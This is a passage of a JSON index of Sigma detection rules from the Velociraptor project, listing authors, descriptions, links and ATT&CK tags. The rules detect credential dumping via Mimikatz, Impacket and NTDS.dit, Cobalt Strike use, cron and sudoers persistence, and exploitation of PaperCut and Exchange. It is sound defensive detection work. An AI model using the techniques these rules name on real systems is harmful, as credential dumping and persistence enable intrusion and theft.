"https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\FIN7\\posh_ps_apt_fin7_powerhold.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.g0046", "detection.emerging_threats"], "title": "Potential APT FIN7 POWERHOLD Execution"}, {"author": "Samir Bousseaden, wagga", "description": "Detect AD credential dumping using impacket secretdump HKTL", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\win_security_impacket_secretdump.yaml", "tags": ["attack.credential_access", "attack.t1003.002", "attack.t1003.004", "attack.t1003.003", "attack.lateral_movement", "attack.execution", "windows", "evtx", "impacket"], "title": "Possible Impacket SecretDump Remote Activity"}, {"author": "Florian Roth (Nextron Systems), @testanull", "description": "Detects log entries that appear in exploitation attempts against MS Exchange RCE CVE-2021-42321", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\exchange\\win_exchange_cve_2021_42321.yaml", "tags": ["attack.lateral_movement", "attack.t1210", "detection.emerging_threats"], "title": "Possible Exploitation of Exchange RCE CVE-2021-42321"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects port forwarding activity via SSH.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\ssh\\proc_creation_win_ssh_port_forward.yaml", "tags": ["attack.command_and_control", "attack.lateral_movement", "attack.t1572", "attack.t1021.001", "attack.t1021.004", "windows", "evtx"], "title": "Port Forwarding Activity Via SSH.EXE"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects creation of sudoers file or files in \"sudoers.d\" directory which can be used a potential method to persiste privileges for a specific user.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_persistence_sudoers_files.yaml", "tags": ["attack.persistence", "attack.t1053.003", "os.linux"], "title": "Persistence Via Sudoers Files"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Detects creation of cron file or files in Cron directories which could indicates potential persistence.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_persistence_cron_files.yaml", "tags": ["attack.persistence", "attack.t1053.003", "os.linux"], "title": "Persistence Via Cron Files"}, {"author": "Tim Shelton (HAWK.IO)", "description": "Detects a when net.exe is called with a password in the command line", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_net_use_password_plaintext.yaml", "tags": ["attack.defense_evasion", "attack.initial_access", "attack.persistence", "attack.privilege_escalation", "attack.lateral_movement", "attack.t1021.002", "attack.t1078", "windows", "evtx", "bad_practice", "generic"], "title": "Password Provided In Command Line Of Net.EXE"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community, Pawel Mazur", "description": "Detects password policy discovery commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_password_policy_discovery.yaml", "tags": ["attack.discovery", "attack.t1201", "os.linux"], "title": "Password Policy Discovery"}, {"author": "Thomas Patzke", "description": "Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage.\nThe process in field Process is the malicious program. A single execution can lead to hundreds of events.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_password_dumper_lsass.yaml", "tags": ["attack.credential_access", "attack.s0005", "attack.t1003.001", "sysmon", "windows", "evtx", "generic"], "title": "Password Dumper Remote Thread in LSASS"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Huntress DE&TH Team (idea)", "description": "Detects suspicious child processes of \"pc-app.exe\". Which could indicate potential exploitation of PaperCut", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\PaperCut-Print-Management-Exploitation\\proc_creation_win_papercut_print_management_exploitation_pc_app.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.papercut_print_management_exploitation"], "title": "PaperCut MF/NG Potential Exploitation"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Huntress DE&TH Team (idea)", "description": "Detects suspicious child processes of \"pc-app.exe\". Which could indicate potential exploitation of PaperCut", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\PaperCut-Print-Management-Exploitation\\proc_creation_win_papercut_print_management_exploitation_pc_app_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.papercut_print_management_exploitation"], "title": "PaperCut MF/NG Potential Exploitation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects exploitation indicators related to PaperCut MF/NG Exploitation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\PaperCut-Print-Management-Exploitation\\proc_creation_win_papercut_print_management_exploitation_indicators_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.papercut_print_management_exploitation", "evtx"], "title": "PaperCut MF/NG Exploitation Related Indicators - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects exploitation indicators related to PaperCut MF/NG Exploitation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\PaperCut-Print-Management-Exploitation\\proc_creation_win_papercut_print_management_exploitation_indicators.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.papercut_print_management_exploitation"], "title": "PaperCut MF/NG Exploitation Related Indicators"}, {"author": "Jakob Weinzettl, oscd.community", "description": "Detects overwriting (effectively wiping/deleting) of a file.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_dd_delete_file.yaml", "tags": ["attack.impact", "attack.t1485", "os.linux"], "title": "Overwriting the File with Dev Zero or Null"}, {"author": "_pete_0, TheDFIRReport", "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\bloopers\\proc_creation_win_hktl_cobaltstrike_bloopers_modules.yaml", "tags": ["attack.execution", "attack.t1059.003", "windows", "evtx", "cobalt_strike"], "title": "Operator Bloopers Cobalt Strike Modules"}, {"author": "_pete_0, TheDFIRReport", "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\bloopers\\sysmon_proc_creation_win_hktl_cobaltstrike_bloopers_modules.yaml", "tags": ["attack.execution", "attack.t1059.003", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Operator Bloopers Cobalt Strike Modules"}, {"author": "_pete_0, TheDFIRReport", "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\bloopers\\proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yaml", "tags": ["attack.execution", "attack.t1059.003", "windows", "evtx", "cobalt_strike"], "title": "Operator Bloopers Cobalt Strike Commands -"}, {"author": "_pete_0, TheDFIRReport", "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\bloopers\\sysmon_proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yaml", "tags": ["attack.execution", "attack.t1059.003", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Operator Bloopers Cobalt Strike Commands"}, {"author": "mdecrevoisier", "description": "Detects scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\ssh\\win_sshd_openssh_server_listening_on_socket.yaml", "tags": ["attack.lateral_movement", "attack.t1021.004", "windows", "evtx"], "title": "OpenSSH Server Listening On Socket"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects file creation activity that is related to Onyx Sleet APT activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Onyx-Sleet\\file_event_win_apt_onyx_sleet_indicators.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.onyx_sleet", "evtx", "sysmon"], "title": "Onyx Sleet APT File Creation Indicators"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects the use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_grep_os_arch_discovery.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "OS Architecture Discovery Via Grep"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.\nSCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yaml", "tags": ["attack.privilege_escalation", "attack.initial_access", "attack.execution", "attack.t1068", "attack.t1190", "attack.t1203", "os.linux"], "title": "OMIGOD SCX RunAsProvider ExecuteShellCommand"}, {"author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_omigod_scx_runasprovider_executescript.yaml", "tags": ["attack.privilege_escalation", "attack.initial_access", "attack.execution", "attack.t1068", "attack.t1190", "attack.t1203", "os.linux"], "title": "OMIGOD SCX RunAsProvider ExecuteScript"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential abuse of ntdsutil to dump ntds.dit database", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\win_esent_ntdsutil_abuse.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "windows", "evtx"], "title": "Ntdsutil Abuse"}, {"author": "Christopher Peacock @SecurePeacock, SCYTHE @scythe_io", "description": "Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_nohup.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "Nohup Execution"}, {"author": "Bhabesh Raj", "description": "Detects exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_nimbuspwn_privilege_escalation_exploit.yaml", "tags": ["attack.privilege_escalation", "attack.t1068", "os.linux"], "title": "Nimbuspwn Exploitation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects creation of local users via the net.exe command with the option \"never expire\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_net_user_add_never_expire.yaml", "tags": ["attack.persistence", "attack.t1136.001", "windows", "evtx", "generic"], "title": "New User Created Via Net.EXE With Never Expire Option"}, {"author": "Endgame, JHasenbusch (adapted to Sigma for oscd.community)", "description": "Identifies the creation of local users via the net.exe command.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_net_user_add.yaml", "tags": ["attack.persistence", "attack.t1136.001"], "title": "New User Created Via Net.EXE"}, {"author": "frack113", "description": "Detects the usage of \"mstsc.exe\" with the \"/v\" flag to initiate a connection to a remote server.\nAdversaries may use valid accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_mstsc_remote_connection.yaml", "tags": ["attack.lateral_movement", "attack.t1021.001", "windows", "evtx"], "title": "New Remote Desktop Connection Initiated Via Mstsc.EXE"}, {"author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel", "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\netsh\\proc_creation_win_netsh_port_forwarding.yaml", "tags": ["attack.lateral_movement", "attack.defense_evasion", "attack.command_and_control", "attack.t1090", "windows", "evtx"], "title": "New Port Forwarding Rule Added Via Netsh.EXE"}, {"author": "Kutepov Anton, oscd.community", "description": "Detects the execution of netsh with the \"trace\" flag in order to start a network capture", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\netsh\\proc_creation_win_netsh_packet_capture.yaml", "tags": ["attack.discovery", "attack.credential_access", "attack.t1040", "windows", "evtx"], "title": "New Network Trace Capture Started Via Netsh.EXE"}, {"author": "Timur Zinniatullin, oscd.community", "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_network_sniffing.yaml", "tags": ["attack.credential_access", "attack.discovery", "attack.t1040", "os.linux"], "title": "Network Sniffing - Linux"}, {"author": "Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)", "description": "Detects execution of Net.exe, whether suspicious or benign.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_net_susp_execution.yaml", "tags": ["attack.discovery", "attack.t1007", "attack.t1049", "attack.t1018", "attack.t1135", "attack.t1201", "attack.t1069.001", "attack.t1069.002", "attack.t1087.001", "attack.t1087.002", "attack.lateral_movement", "attack.t1021.002", "attack.s0039", "windows", "evtx", "generic"], "title": "Net.exe Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a new named pipe using the \"mkfifo\" utility", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_mkfifo_named_pipe_creation.yaml", "tags": ["attack.execution", "os.linux"], "title": "Named Pipe Created Via Mkfifo"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon process or a process located in a suspicious directory", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_file_event_win_ntds_dit_uncommon_process.yaml", "tags": ["attack.credential_access", "attack.t1003.002", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "NTDS.DIT Creation By Uncommon Process"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_file_event_win_ntds_dit_uncommon_parent_process.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "NTDS.DIT Creation By Uncommon Parent Process"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects creation of a file named \"ntds.dit\" (Active Directory Database)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_file_event_win_ntds_dit_creation.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "NTDS.DIT Created"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects creation of files with specific name patterns seen used in various tools that export the NTDS.DIT for exfiltration.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_file_event_win_ntds_exfil_tools.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "NTDS Exfiltration Filename Patterns"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock @securepeacock", "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_mstsc_run_local_rdp_file.yaml", "tags": ["attack.command_and_control", "attack.t1219", "windows", "evtx"], "title": "Mstsc.EXE Execution With Local RDP File"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_mstsc_run_local_rpd_file_susp_parent.yaml", "tags": ["attack.lateral_movement", "windows", "evtx"], "title": "Mstsc.EXE Execution From Uncommon Parent"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious command line using the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, htpp...)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_mshtml_runhtmlapplication.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Mshtml DLL RunHTMLApplication Abuse"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects execution of the \"mount\" command with \"hidepid\" parameter to make invisible processes to other users from the system", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_mount_hidepid.yaml", "tags": ["attack.credential_access", "attack.t1564", "os.linux"], "title": "Mount Execution With Hidepid Parameter"}, {"author": "Pawel Mazur", "description": "Detects suspicious modification of crontab file.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\cron\\lnx_cron_crontab_file_modification.yaml", "tags": ["attack.persistence", "attack.t1053.003", "os.linux"], "title": "Modifying Crontab"}, {"author": "IAI", "description": "Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access.\nDetection rules that match only on the disabling of firewalls will miss this.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_modify_system_firewall.yaml", "tags": ["attack.t1562.004", "attack.defense_evasion", "os.linux"], "title": "Modify System Firewall"}, {"author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community", "description": "Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_ld_so_preload_mod.yaml", "tags": ["attack.defense_evasion", "attack.t1574.006", "os.linux"], "title": "Modification of ld.so.preload"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects suspicious execution from ManageEngine as seen used by Mint Sandstorm", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.mint_sandstorm", "software.manageengine", "evtx", "sysmon"], "title": "Mint Sandstorm - ManageEngine Suspicious Process Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects suspicious execution from ManageEngine as seen used by Mint Sandstorm", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.mint_sandstorm", "software.manageengine"], "title": "Mint Sandstorm - ManageEngine Suspicious Process Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects Log4J Wstomcat process execution as seen in Mint Sandstorm activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_log4j_wstomcat_execution_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.mint_sandstorm"], "title": "Mint Sandstorm - Log4J Wstomcat Process Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects Log4J Wstomcat process execution as seen in Mint Sandstorm activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_log4j_wstomcat_execution.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "apt.mint_sandstorm"], "title": "Mint Sandstorm - Log4J Wstomcat Process Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects suspicious execution from AsperaFaspex as seen used by Mint Sandstorm", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.mint_sandstorm"], "title": "Mint Sandstorm - AsperaFaspex Suspicious Process Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems), MSTIC (idea)", "description": "Detects suspicious execution from AsperaFaspex as seen used by Mint Sandstorm", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mint-Sandstorm\\proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.mint_sandstorm"], "title": "Mint Sandstorm - AsperaFaspex Suspicious Process Execution"}, {"author": "Florian Roth (Nextron Systems), David ANDRE (additional keywords)", "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\mimikatz\\win_alert_mimikatz_keywords.yaml", "tags": ["attack.s0002", "attack.lateral_movement", "attack.credential_access", "car.2013-07-001", "car.2019-04-004", "attack.t1003.002", "attack.t1003.004", "attack.t1003.001", "attack.t1003.006", "windows", "evtx", "mimikatz", "sysmon"], "title": "Mimikatz Use"}, {"author": "Benjamin Delpy, Florian Roth (Nextron Systems), Scott Dermott, Sorina Ionescu", "description": "Detects Mimikatz DC sync security events", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\dcsync\\win_security_dcsync.yaml", "tags": ["attack.credential_access", "attack.s0002", "attack.t1003.006", "windows", "evtx"], "title": "Mimikatz DC Sync"}, {"author": "Tim Rauch, Janantha Marasinghe", "description": "Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_appcmd_service_account_password_dumped.yaml", "tags": ["attack.credential_access", "attack.t1003", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Microsoft IIS Service Account Password Dumped"}, {"author": "Tim Rauch", "description": "Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_connection_strings_decryption.yaml", "tags": ["attack.credential_access", "attack.t1003", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Microsoft IIS Connection Strings Decryption"}, {"author": "Teymur Kheirkhabarov, Ecco, Florian Roth", "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\win_system_meterpreter_or_cobaltstrike_getsystem_service_installation.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.001", "attack.t1134.002", "windows", "evtx", "cobalt_strike"], "title": "Meterpreter or Cobalt Strike Getsystem Service Installation - System"}, {"author": "Teymur Kheirkhabarov, Ecco, Florian Roth", "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.001", "attack.t1134.002", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Meterpreter or Cobalt Strike Getsystem Service Installation"}, {"author": "Bartlomiej Czyz, Relativity", "description": "Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and Impacket psexec.py by triggering on specific service installation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\win_security_metasploit_or_impacket_smb_psexec_service_install.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "attack.t1570", "attack.execution", "attack.t1569.002", "attack.execution", "windows", "evtx", "metasploit", "impacket"], "title": "Metasploit Or Impacket Service Installation Via SMB PsExec"}, {"author": "Timur Zinniatullin, oscd.community", "description": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.\nSeveral different variations of this technique have been observed.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_masquerading_crond.yaml", "tags": ["attack.defense_evasion", "attack.t1036.003", "os.linux"], "title": "Masquerading as Linux Crond Process"}, {"author": "Markus Neis, Nasreddine Bencherchali (Nextron Systems), Mustafa Kaan Demir, Georg Lauenstein", "description": "Detects the creation of known offensive powershell scripts used for exploitation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\sysmon_file_event_win_powershell_exploit_scripts.yaml", "tags": ["attack.execution", "attack.t1059.001", "sysmon", "windows", "evtx", "generic", "powershell"], "title": "Malicious PowerShell Scripts - FileCreation"}, {"author": "Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias Michalski, Austin Songer", "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\script_block_win_powershell_malicious_cmdlets.yaml", "tags": ["attack.execution", "attack.discovery", "attack.t1482", "attack.t1087", "attack.t1087.001", "attack.t1087.002", "attack.t1069.001", "attack.t1069.002", "attack.t1069", "attack.t1059.001"], "title": "Malicious PowerShell Commandlets - ScriptBlock"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\proc_creation_win_powershell_malicious_cmdlets.yaml", "tags": ["attack.execution", "attack.discovery", "attack.t1482", "attack.t1087", "attack.t1087.001", "attack.t1087.002", "attack.t1069.001", "attack.t1069.002", "attack.t1069", "attack.t1059.001", "windows", "evtx", "generic", "powershell"], "title": "Malicious PowerShell Commandlets - ProcessCreation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\sysmon_proc_creation_win_powershell_malicious_cmdlets.yaml", "tags": ["attack.execution", "attack.discovery", "attack.t1482", "attack.t1087", "attack.t1087.001", "attack.t1087.002", "attack.t1069.001", "attack.t1069.002", "attack.t1069", "attack.t1059.001", "sysmon", "windows", "evtx", "generic", "powershell"], "title": "Malicious PowerShell Commandlets - ProcessCreation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\posh_module_win_powershell_malicious_cmdlets.yaml", "tags": ["attack.execution", "attack.discovery", "attack.t1482", "attack.t1087", "attack.t1087.001", "attack.t1087.002", 